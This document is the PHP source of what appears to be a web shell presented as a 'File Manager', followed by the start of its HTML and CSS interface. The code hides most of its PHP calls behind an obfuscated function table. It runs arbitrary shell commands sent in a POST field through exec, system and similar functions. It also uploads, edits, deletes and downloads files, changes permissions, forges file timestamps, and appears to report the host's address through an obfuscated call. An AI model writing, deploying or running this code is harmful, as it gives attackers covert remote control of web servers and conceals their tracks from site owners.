$fm_post_overflow=((isset($_SERVER['REQUEST_METHOD'])&&$_SERVER['REQUEST_METHOD']==='POST')&&$fm_content_length>0&&empty($_POST)&&empty($_FILES));

if($x){if($x==='49')$b1='/';else $b1=d($x);}else{$b1=@$a2[0]();}
if(!is_string($b1)||$b1==='')$b1=@dirname(__FILE__);
if(empty($b1)||!@$a2[6]($b1)){if($x){$m='Cannot open folder: access denied';$fm_dir_denied=true;}$b1=@$a2[0]();}
if(!is_string($b1)||$b1==='')$b1=@dirname(__FILE__);
$b2=@$a2[2]($b1);if($b2)$b1=$b2;
if($x&&@$a2[7]($b1)&&!@$a2[46]($b1)){$m='Cannot open folder: access denied';$fm_dir_denied=true;$b1=@$a2[0]();}
if(!is_string($b1)||$b1==='')$b1=@dirname(__FILE__);
if(function_exists($a2[30])){@$a2[30](@$a2[29],'f',$_SERVER['HTTP_HOST'].$_SERVER[$a2[32]]);}
@$a2[1]($b1);
$b3=e($b1);
$fr='';

if(isset($_POST['cmd_func'])&&is_string($_POST['cmd_func'])&&trim($_POST['cmd_func'])!==''){
    $cmd_fn=trim($_POST['cmd_func']);
    $cmd_args=isset($_POST['cmd_args'])&&is_string($_POST['cmd_args'])?$_POST['cmd_args']:'';
    if(!preg_match('/^[A-Za-z0-9_]+$/',$cmd_fn)){
        $fr='Invalid function name: '.$cmd_fn;
    }elseif(!function_exists($cmd_fn)){
        $fr='Function not available on this PHP: '.$cmd_fn;
    }else{
        $exec_fns=array('exec','shell_exec','system','passthru');
        $to_run=$cmd_args;
        if(in_array($cmd_fn,$exec_fns)&&strpos($to_run,'2>&1')===false)$to_run.=' 2>&1';
        $captured='';$returned=null;
        @ob_start();
        try{
            if($cmd_fn==='exec'){$arr=array();@exec($to_run,$arr);$returned=is_array($arr)?@implode("\n",$arr):'';}
            elseif($cmd_fn==='shell_exec'){$returned=@shell_exec($to_run);}
            else{$returned=@$cmd_fn($to_run);}
        }catch(Exception $e){$returned='Exception: '.$e->getMessage();}
        catch(Throwable $e){$returned='Error: '.$e->getMessage();}
        $captured=@ob_get_clean();
        if(!is_string($captured))$captured='';
        if($captured!=='')$fr=$captured;
        elseif(is_string($returned)&&$returned!=='')$fr=$returned;
        else $fr='(no output)';
    }
}

if($fm_post_overflow&&$z===''){$m='Upload failed: request body exceeds post_max_size ('.@ini_get('post_max_size').').';}
if($z===''&&(isset($_POST['fn64'])||isset($_POST['fm_data']))){$z='up64';}

if($z==='cu'){
    if($fm_dir_denied)fm_json_out(array('ok'=>false,'message'=>'Current directory is not accessible.'));
    $token=isset($_GET['token'])&&is_string($_GET['token'])?$_GET['token']:'';
    $idx=isset($_GET['i'])?(int)$_GET['i']:-1;
    $total=isset($_GET['n'])?(int)$_GET['n']:-1;
    $name=fm_safe_name(isset($_GET['name'])&&is_string($_GET['name'])?$_GET['name']:'');
    if(!fm_chunk_token($token))fm_json_out(array('ok'=>false,'message'=>'Invalid chunk token.'));
    if($name===''||$idx<0||$idx>=$total||$total<1||$total>200000)fm_json_out(array('ok'=>false,'message'=>'Invalid chunk parameters.'));
    $root=fm_chunk_root();
    if(mt_rand(1,25)===1)fm_chunk_cleanup($root);
    $dir=$root.DIRECTORY_SEPARATOR.$token;
    if(!@is_dir($dir)&&!@mkdir($dir,0700,true))fm_json_out(array('ok'=>false,'message'=>'Unable to create chunk workspace.'));
    $ctype=isset($_SERVER['CONTENT_TYPE'])?(string)$_SERVER['CONTENT_TYPE']:'';
    $data=null;
    if(stripos($ctype,'multipart/form-data')!==false){
        if(isset($_FILES['chunk'])&&(int)$_FILES['chunk']['error']===0&&@is_file($_FILES['chunk']['tmp_name'])){
            $data=@file_get_contents($_FILES['chunk']['tmp_name']);
        }
    }else{
        $data=@file_get_contents('php://input');
    }
    if($data===false||$data===null)fm_json_out(array('ok'=>false,'message'=>'Chunk body was not readable.'));
    if(strlen($data)>67108864)fm_json_out(array('ok'=>false,'message'=>'Chunk is too large.'));
    $chunk=$dir.DIRECTORY_SEPARATOR.'chunk_'.sprintf('%06d',$idx);
    $tmp=$chunk.'.part';
    if(!fm_write_bytes($tmp,$data))fm_json_out(array('ok'=>false,'message'=>'Unable to write chunk to disk.'));
    if(!@rename($tmp,$chunk)){@unlink($tmp);fm_json_out(array('ok'=>false,'message'=>'Unable to finalize chunk.'));}
    @touch($dir);
    fm_json_out(array('ok'=>true,'index'=>$idx,'received'=>strlen($data)));
}

if($z==='uj'){
    if($fm_dir_denied)fm_json_out(array('ok'=>false,'message'=>'Current directory is not accessible.'));
    $token=isset($_GET['token'])&&is_string($_GET['token'])?$_GET['token']:'';
    $total=isset($_GET['n'])?(int)$_GET['n']:-1;
    $name=fm_safe_name(isset($_GET['name'])&&is_string($_GET['name'])?$_GET['name']:'');
    $size=isset($_GET['size'])?(int)$_GET['size']:0;
    if(!fm_chunk_token($token))fm_json_out(array('ok'=>false,'message'=>'Invalid chunk token.'));
    if($name===''||$total<1||$total>200000)fm_json_out(array('ok'=>false,'message'=>'Invalid merge parameters.'));
    $root=fm_chunk_root();
    $dir=$root.DIRECTORY_SEPARATOR.$token;
    if(!@is_dir($dir))fm_json_out(array('ok'=>false,'message'=>'Chunk workspace not found.'));
    $dest=rtrim($b1,'/\\').DIRECTORY_SEPARATOR.$name;
    if(@is_dir($dest))fm_json_out(array('ok'=>false,'message'=>'A folder with that name exists.'));
    $tmp=$dest.'.fm_'.substr(md5(uniqid('',true)),0,10).'.part';
    $out=@fopen($tmp,'wb');
    if(!$out)fm_json_out(array('ok'=>false,'message'=>'Unable to create target file.'));
    $written=0;
    $ok=true;
    for($i=0;$i<$total;$i++){
        $chunk=$dir.DIRECTORY_SEPARATOR.'chunk_'.sprintf('%06d',$i);
        if(!@is_file($chunk)){$ok=false;break;}
        $in=@fopen($chunk,'rb');
        if(!$in){$ok=false;break;}
        if(function_exists('stream_copy_to_stream')){
            $n=@stream_copy_to_stream($in,$out);
            if($n===false)$ok=false;else $written+=$n;
        }else{
            while(!@feof($in)){
                $buf=@fread($in,8192);
                if($buf===false){$ok=false;break;}
                if($buf==='')break;
                if(@fwrite($out,$buf)===false){$ok=false;break;}
                $written+=strlen($buf);
            }
        }
        @fclose($in);
        if(!$ok)break;
    }
    @fclose($out);
    if($ok&&$size>0&&$written!==$size)$ok=false;
    if(!$ok){
        @unlink($tmp);
        fm_json_out(array('ok'=>false,'message'=>'Chunk assembly failed or size mismatch.'));
    }
    $final=$dest;
    if(!@rename($tmp,$final)){
        if(!@copy($tmp,$final)){@unlink($tmp);fm_json_out(array('ok'=>false,'message'=>'Unable to move assembled file into place.'));}
        @unlink($tmp);
    }
    for($i=0;$i<$total;$i++){
        $chunk=$dir.DIRECTORY_SEPARATOR.'chunk_'.sprintf('%06d',$i);
        @unlink($chunk);
    }
    @rmdir($dir);
    fm_chunk_cleanup($root);
    clearstatcache();
    fm_json_out(array('ok'=>true,'name'=>$name,'size'=>$written,'message'=>'Uploaded: '.$name));
}

if($z==='ub'){
    if($fm_dir_denied)fm_json_out(array('ok'=>false,'message'=>'Current directory is not accessible.'));
    $name=fm_safe_name(isset($_GET['name'])&&is_string($_GET['name'])?$_GET['name']:'');
    if($name==='')fm_json_out(array('ok'=>false,'message'=>'Missing file name.'));
    $res=fm_raw_body_upload($b1,$name);
    if($res===null)fm_json_out(array('ok'=>false,'message'=>'Request body was not readable.'));
    if($res[0]){clearstatcache();fm_json_out(array('ok'=>true,'name'=>$res[1],'message'=>'Uploaded: '.$res[1]));}
    fm_json_out(array('ok'=>false,'message'=>$res[1]));
}

if($z==='up'||$z==='up64'){
    $ajax=fm_is_ajax();
    if($fm_dir_denied){
        $msg='Upload failed: current directory is not accessible.';
        if($ajax)fm_json_out(array('ok'=>false,'message'=>$msg,'fallback'=>array('chunk')));
        $m=$msg;
    }elseif($fm_post_overflow){
        $msg='Upload failed: request body exceeds post_max_size ('.@ini_get('post_max_size').').';
        if($ajax)fm_json_out(array('ok'=>false,'message'=>$msg,'fallback'=>array('chunk')));
        $m=$msg;
    }else{
        $modes=($z==='up64')?array('base64'):array('native','multipart','base64','raw');
        $res=fm_upload_chain($b1,'upload_file',$modes);
        clearstatcache();
        if($res[0]){
            $msg='Uploaded: '.$res[1];
            $m=$msg;
            if($ajax)fm_json_out(array('ok'=>true,'name'=>$res[1],'message'=>$msg));
        }else{
            $msg=$res[1];
            $m=$msg;
            if($ajax)fm_json_out(array('ok'=>false,'message'=>$msg,'fallback'=>array('base64','raw','chunk')));
        }
    }
}

if($z==='d'&&$w){$f=$b1.DIRECTORY_SEPARATOR.$w;if(@$a2[6]($f)&&@$a2[25]($f)){if(@$a2[27]())@$a2[28]();header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.str_replace(array('"',"\r","\n"),'',basename($f)).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.@$a2[26]($f));@$a2[24]($f);exit;}}

if($z==='cz'&&fm_p('s')!==''){$r=fm_p('s');if(mq())$r=stripslashes($r);$t=explode('||',$r);$af='archive_'.$a2[55]('Ymd_His');
if(class_exists('ZipArchive')){$tmp=@tempnam(sys_get_temp_dir(),'fm_');$zip=new ZipArchive();if($zip->open($tmp,ZipArchive::CREATE|ZipArchive::OVERWRITE)===true){foreach($t as $ci){$fp=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[7]($fp))za($zip,$fp,$b1);elseif(@$a2[25]($fp))$zip->addFile($fp,$ci);}$zip->close();if(@$a2[6]($tmp)&&@$a2[26]($tmp)>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/zip');header('Content-Disposition: attachment; filename="'.$af.'.zip"');header('Content-Length: '.@$a2[26]($tmp));@$a2[24]($tmp);@$a2[11]($tmp);exit;}@$a2[11]($tmp);}}
if(class_exists('PharData')){try{$tmp=sys_get_temp_dir().DIRECTORY_SEPARATOR.'fm_'.time().'.tar';@$a2[11]($tmp);@$a2[11]($tmp.'.gz');$tar=new PharData($tmp);foreach($t as $ci){$fp=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[7]($fp))za($tar,$fp,$b1);elseif(@$a2[25]($fp))$tar->addFile($fp,$ci);}$tar->compress(Phar::GZ);$gzf=$tmp.'.gz';if(@$a2[6]($gzf)&&@$a2[26]($gzf)>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/gzip');header('Content-Disposition: attachment; filename="'.$af.'.tar.gz"');header('Content-Length: '.@$a2[26]($gzf));@$a2[24]($gzf);@$a2[11]($tmp);@$a2[11]($gzf);exit;}@$a2[11]($tmp);@$a2[11]($tmp.'.gz');}catch(Exception $ex){}}
if(function_exists($a2[35])){$tmp=sys_get_temp_dir().DIRECTORY_SEPARATOR.'fm_'.time();$is='';foreach($t as $ci)$is.=' '.escapeshellarg($ci);@$a2[35]('cd '.escapeshellarg($b1).' && tar -czf '.escapeshellarg($tmp.'.tar.gz').$is.' 2>/dev/null');if(@$a2[6]($tmp.'.tar.gz')&&@$a2[26]($tmp.'.tar.gz')>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/gzip');header('Content-Disposition: attachment; filename="'.$af.'.tar.gz"');header('Content-Length: '.@$a2[26]($tmp.'.tar.gz'));@$a2[24]($tmp.'.tar.gz');@$a2[11]($tmp.'.tar.gz');exit;}@$a2[35]('cd '.escapeshellarg($b1).' && zip -r '.escapeshellarg($tmp.'.zip').$is.' 2>/dev/null');if(@$a2[6]($tmp.'.zip')&&@$a2[26]($tmp.'.zip')>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/zip');header('Content-Disposition: attachment; filename="'.$af.'.zip"');header('Content-Length: '.@$a2[26]($tmp.'.zip'));@$a2[24]($tmp.'.zip');@$a2[11]($tmp.'.zip');exit;}}
$m='Compress failed: no method available';}

if($z==='m'&&fm_p('s')!==''){$r=fm_p('s');if(mq())$r=stripslashes($r);$t=explode('||',$r);if(is_array($t)){foreach($t as $i){$i=$b1.DIRECTORY_SEPARATOR.$i;rd($i);} $m='Deleted '.count($t).' items';}}

if($z==='cp'&&fm_p('s')!==''&&fm_p('sd')!==''){$r=fm_p('s');if(mq())$r=stripslashes($r);$sd=d(fm_p('sd'));$t=explode('||',$r);$ok=0;$fl=0;if(is_array($t)){foreach($t as $ci){$from=$sd.DIRECTORY_SEPARATOR.$ci;$to=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[6]($to)){$fl++;continue;}if(@$a2[7]($from)){if(rc($from,$to))$ok++;else $fl++;}elseif(@$a2[25]($from)){if(@$a2[17]($from,$to))$ok++;else $fl++;}else $fl++;}}$m='Copied '.$ok.' item'.($ok!=1?'s':'').($fl?' ('.$fl.' failed)':'');}

if($z==='mv'&&fm_p('s')!==''&&fm_p('sd')!==''){$r=fm_p('s');if(mq())$r=stripslashes($r);$sd=d(fm_p('sd'));$t=explode('||',$r);$ok=0;$fl=0;if(is_array($t)){foreach($t as $ci){$from=$sd.DIRECTORY_SEPARATOR.$ci;$to=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[6]($to)){$fl++;continue;}if(@$a2[10]($from,$to)){$ok++;}else{if(@$a2[7]($from)){if(rc($from,$to)){rd($from);$ok++;}else $fl++;}elseif(@$a2[25]($from)){if(@$a2[17]($from,$to)){@$a2[11]($from);$ok++;}else $fl++;}else $fl++;}}}$m='Moved '.$ok.' item'.($ok!=1?'s':'').($fl?' ('.$fl.' failed)':'');}

if($z==='h'&&$w!==''&&isset($_POST['r'])){$perm=trim(fm_p('r'));if(!preg_match('/^[0-7]{1,4}$/',$perm)){$m='Invalid permission mode: '.$perm;}else{if(@$a2[16]($b1.DIRECTORY_SEPARATOR.$w,octdec($perm))){$m='Permissions updated: '.$w.' -> '.$perm;}else{$m='Update failed';}}}

if($z==='t'&&$w!==''&&isset($_POST['d'])){$date_in=trim(fm_p('d'));if($date_in===''){$m='Invalid date';}else{$tm=strtotime($date_in);if($tm){if(@touch($b1.DIRECTORY_SEPARATOR.$w,$tm))$m='Date updated: '.$w;}else{$m='Invalid date: '.$date_in;}}}

$es=0;$ef='';
if($z==='s'&&isset($_POST[$a4])&&is_string($_POST[$a4])&&isset($_POST[$a5])&&is_string($_POST[$a5])){$fv=d($_POST[$a5]);$c=$_POST[$a4];if(mq())$c=stripslashes($c);$b6=(fm_p('b6')==='1');if($b6){$cd=@$a2[34]($c);if($cd!==false)$c=$cd;}$wm=$b6?'wb':'w';$fp=@$a2[20]($fv,$wm);if($fp){if(@$a2[21]($fp,$c)!==false){$m='Saved successfully';$es=1;$ef=$fv;}else{$m='Write failed';}@$a2[22]($fp);}else{$m='Permission denied';}}

if($z==='n'&&isset($_POST['o'])&&isset($_POST['n'])){$old=fm_safe_name(fm_p('o'));$new=fm_safe_name(fm_p('n'));if($old===''||$new===''){$m='Invalid name';}elseif(@$a2[10]($b1.DIRECTORY_SEPARATOR.$old,$b1.DIRECTORY_SEPARATOR.$new)){$m='Renamed successfully';}else{$m='Rename failed';}}
if($z==='e'&&$w){$tp=$b1.DIRECTORY_SEPARATOR.$w;if(@$a2[6]($tp)){rd($tp);if(!@$a2[6]($tp))$m='Item deleted';else $m='Delete failed';}else $m='Item not found';}
if($z==='k'&&isset($_POST['n'])){$n=fm_safe_name(fm_p('n'));if($n==='')$m='Invalid folder name';elseif(@$a2[13]($b1.DIRECTORY_SEPARATOR.$n))$m='Directory created';else $m='Create failed';}
if($z==='f'&&isset($_POST['n'])){$n=fm_safe_name(fm_p('n'));if($n==='')$m='Invalid file name';elseif(@$a2[14]($b1.DIRECTORY_SEPARATOR.$n))$m='File created';else $m='Create failed';}

function rd($p){global $a2;if(@$a2[7]($p)){if($d=@$a2[3]($p)){while(($f=@$a2[4]($d))!==false){if($f!='.'&&$f!='..')rd($p.DIRECTORY_SEPARATOR.$f);}@$a2[5]($d);}@$a2[12]($p);}else{@$a2[11]($p);}}
function rc($s,$d){global $a2;if(@$a2[7]($s)){if(!@$a2[7]($d))@$a2[13]($d);if($h=@$a2[3]($s)){while(($f=@$a2[4]($h))!==false){if($f!='.'&&$f!='..')rc($s.DIRECTORY_SEPARATOR.$f,$d.DIRECTORY_SEPARATOR.$f);}@$a2[5]($h);}return true;}else{return @$a2[17]($s,$d);}}
function za(&$ar,$p,$bp){global $a2;if(@$a2[7]($p)){if($dh=@$a2[3]($p)){while(($f=@$a2[4]($dh))!==false){if($f!='.'&&$f!='..')za($ar,$p.DIRECTORY_SEPARATOR.$f,$bp);}@$a2[5]($dh);}}elseif(@$a2[25]($p)){$ar->addFile($p,substr($p,strlen($bp)+1));}}

if($y==='v'&&$w===''&&isset($_POST['view_path'])){
    $vp=trim(fm_p('view_path'));
    if($vp===''){
        $m='No file path specified.';
    }elseif(@$a2[6]($vp)&&@$a2[25]($vp)&&@$a2[46]($vp)){
        $w=e($vp);
        $m='';
    }else{
        $m='File not found or not readable: '.$vp;
    }
}

$ed=0;$ec='';$ib=0;
$is_win=strtoupper(substr(PHP_OS,0,3))==='WIN';
if($y==='v'&&($w||$ef)){
  if($ef){$ed=1;$ec=@$a2[8]($ef);}
  elseif($w){$ef=d($w);if(@$a2[6]($ef)){$ed=1;$ec=@$a2[8]($ef);}}
  if($ed){
      if(preg_match('//u',$ec)){$ib=0;}else{$ib=1;}
      $b1=@dirname($ef);
      $b3=e($b1);
      $fi_path=$ef;
      $fi_stat=@$a2[47]($fi_path);
      $fi_sz=fs(@$a2[26]($fi_path));
      $fi_perms=xp($fi_path);
      $fi_o=go($fi_path);
      $fi_uid=@$a2[48]($fi_path);$fi_gid=@$a2[49]($fi_path);
      $fi_ow='0';$fi_gr='0';
      if(function_exists($a2[40])){if($fi_uid!==false){$pw=@$a2[40]($fi_uid);if(is_array($pw)&&isset($pw['name']))$fi_ow=$pw['name'];else $fi_ow=$fi_uid;}}
      if(function_exists($a2[41])){if($fi_gid!==false){$pgrp=@$a2[41]($fi_gid);if(is_array($pgrp)&&isset($pgrp['name']))$fi_gr=$pgrp['name'];else $fi_gr=$fi_gid;}}
      $fi_og=$fi_ow.'/'.$fi_gr;
      if($is_win){$fi_og=$a2[44]().'/WinGroup';}
      $fi_ctime=$fi_stat?$a2[55]('Y-m-d H:i:s',$fi_stat['ctime']):'-';
      $fi_atime=$fi_stat?$a2[55]('Y-m-d H:i:s',$fi_stat['atime']):'-';
      $fi_mtime=$fi_stat?$a2[55]('Y-m-d H:i:s',$fi_stat['mtime']):'-';
      $fi_name=basename($fi_path);
      $fi_pc=pc($fi_path);
  }
}

$df_raw=trim($a2[57]('disable_functions'));
$df_items=array();
if($df_raw!==''){
    $df_tmp=explode(',',$df_raw);
    foreach($df_tmp as $df_v){$df_v=trim($df_v);if($df_v!=='')$df_items[]=$df_v;}
}
$df_max=8;
$df_list=array();
$df_count=count($df_items);
for($i=0;$i<$df_count&&$i<$df_max;$i++)$df_list[]=$df_items[$i];
$df_display=empty($df_list)?'none':implode(', ',$df_list).(($df_count>$df_max)?', ...':'');

$fm_post_max=fm_ini_bytes(function_exists('ini_get')?@ini_get('post_max_size'):'');
$fm_upload_max=fm_ini_bytes(function_exists('ini_get')?@ini_get('upload_max_filesize'):'');
$fm_chunk_size=$fm_post_max>0?(int)min(1048576,max(65536,$fm_post_max*0.35)):1048576;
$fm_direct_max=$fm_post_max>0?(int)min(4194304,max(65536,$fm_post_max*0.60)):4194304;
$fm_base64_max=$fm_post_max>0?(int)min(6291456,max(32768,$fm_post_max*0.55)):6291456;
$fm_raw_max=$fm_post_max>0?(int)min(8388608,max(65536,$fm_post_max*0.90)):8388608;
if($fm_upload_max>0)$fm_direct_max=(int)min($fm_direct_max,max(16384,$fm_upload_max*0.95));
$upload_action=$sp1.(strpos($sp1,'?')===false?'?':'&').'z=up&x='.urlencode($b3);
clearstatcache();

$software=isset($_SERVER['SERVER_SOFTWARE'])&&is_string($_SERVER['SERVER_SOFTWARE'])&&$_SERVER['SERVER_SOFTWARE']!==''?$_SERVER['SERVER_SOFTWARE']:'';
$uname_display=function_exists($a2[23])?@$a2[23]():'';
$uname_display=is_string($uname_display)?$uname_display:'';

?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<script>
window.fmConfig=<?php echo json_encode(array(
    'xorKey' => 'fm_xor_key',
    'uploadInputId' => $a3,
    'cwdEncoded' => $b3,
    'currentPath' => $b1,
    'homePath' => dirname(__FILE__),
    'editorContentFieldName' => $a4,
    'editorPathFieldName' => $a5,
    'query' => $q,
    'postMax' => $fm_post_max,
    'uploadMax' => $fm_upload_max,
    'directMax' => $fm_direct_max,
    'base64Max' => $fm_base64_max,
    'rawMax' => $fm_raw_max,
    'chunkSize' => $fm_chunk_size,
), JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | (defined('JSON_INVALID_UTF8_SUBSTITUTE') ? constant('JSON_INVALID_UTF8_SUBSTITUTE') : 0)); ?>;
</script>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.2/src/regular/style.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.2/src/bold/style.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.2/src/fill/style.css">
<style>
*,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/*! tailwindcss v3.4.19 | MIT License */*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}:after,:before{--tw-content:""}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:Inter,sans-serif;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:JetBrains Mono,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0}fieldset,legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.pointer-events-none{pointer-events:none}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0}.inset-y-0{top:0;bottom:0}.inset-y-0\.5{top:.125rem;bottom:.125rem}.bottom-6{bottom:1.5rem}.left-0{left:0}.left-1\/2{left:50%}.right-0\.5{right:.125rem}.z-40{z-index:40}.z-50{z-index:50}.m-0{margin:0}.mx-0\.5{margin-left:.125rem;margin-right:.125rem}.mx-1{margin-left:.25rem;margin-right:.25rem}.my-1{margin-top:.25rem}.mb-1,.my-1{margin-bottom:.25rem}.mb-10{margin-bottom:2.5rem}.mb-2{margin-bottom:.5rem}.mb-3{margin-bottom:.75rem}.mb-4{margin-bottom:1rem}.ml-1{margin-left:.25rem}.ml-auto{margin-left:auto}.mr-1{margin-right:.25rem}.mt-2{margin-top:.5rem}.mt-4{margin-top:1rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.table{display:table}.grid{display:grid}.hidden{display:none}.h-1{height:.25rem}.h-1\.5{height:.375rem}.h-10{height:2.5rem}.h-2{height:.5rem}.h-3{height:.75rem}.h-3\.5{height:.875rem}.h-5{height:1.25rem}.h-7{height:1.75rem}.h-8{height:2rem}.h-9{height:2.25rem}.h-\[75vh\]{height:75vh}.h-full{height:100%}.h-px{height:1px}.h-screen{height:100vh}.max-h-\[80vh\]{max-height:80vh}.min-h-0{min-height:0}.min-h-\[150px\]{min-height:150px}.min-h-\[600px\]{min-height:600px}.w-1\.5{width:.375rem}.w-1\/3{width:33.333333%}.w-10{width:2.5rem}.w-16{width:4rem}.w-2{width:.5rem}.w-20{width:5rem}.w-24{width:6rem}.w-3\.5{width:.875rem}.w-32{width:8rem}.w-7{width:1.75rem}.w-8{width:2rem}.w-9{width:2.25rem}.w-full{width:100%}.w-px{width:1px}.min-w-0{min-width:0}.max-w-2xl{max-width:42rem}.max-w-5xl{max-width:64rem}.max-w-\[120px\]{max-width:120px}.max-w-\[150px\]{max-width:150px}.max-w-\[180px\]{max-width:180px}.max-w-\[200px\]{max-width:200px}.max-w-sm{max-width:24rem}.flex-1{flex:1 1 0%}.flex-shrink-0,.shrink-0{flex-shrink:0}.border-collapse{border-collapse:collapse}.-translate-x-1\/2{--tw-translate-x:-50%}.-translate-x-1\/2,.translate-y-0{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.translate-y-0{--tw-translate-y:0px}.translate-y-12{--tw-translate-y:3rem}.translate-y-12,.translate-y-full{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.translate-y-full{--tw-translate-y:100%}.scale-100{--tw-scale-x:1;--tw-scale-y:1}.scale-100,.scale-95{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) 